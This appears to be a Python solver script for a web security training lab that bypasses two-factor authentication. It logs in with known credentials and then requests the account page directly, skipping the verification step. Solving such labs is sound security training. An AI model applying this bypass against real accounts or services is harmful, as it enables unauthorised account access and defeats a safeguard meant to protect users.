import requests
import sys


class LabSolver:
    def __init__(self, lab_url):
        self.lab_url = lab_url if lab_url.endswith('/') else lab_url + '/'
        self.session = requests.Session()
        self.valid_username = 'carlos'
        self.valid_password = 'montoya'

    def bypass_2fa(self):
        data = {
            'username': self.valid_username,
            'password': self.valid_password
        }
        self.session.post(self.lab_url + 'login', data=data)
        self.session.get(self.lab_url + 'my-account?id=carlos')

    def checking_solution(self):
        response = self.session.get(self.lab_url)
        if 'Congratulations, you solved the lab!' in response.text:
            print('You solved the lab.')
            print('Coded by Mohamed Ahmed (ma4747gh).')
            print('My GitHub account: https://github.com/ma4747gh')
            print('My LinkedIn account: https://eg.linkedin.com/in/ma4747gh')

    def solve(self):
        self.bypass_2fa()
        self.checking_solution()


lab_solver = LabSolver(sys.argv[1])
lab_solver.solve()
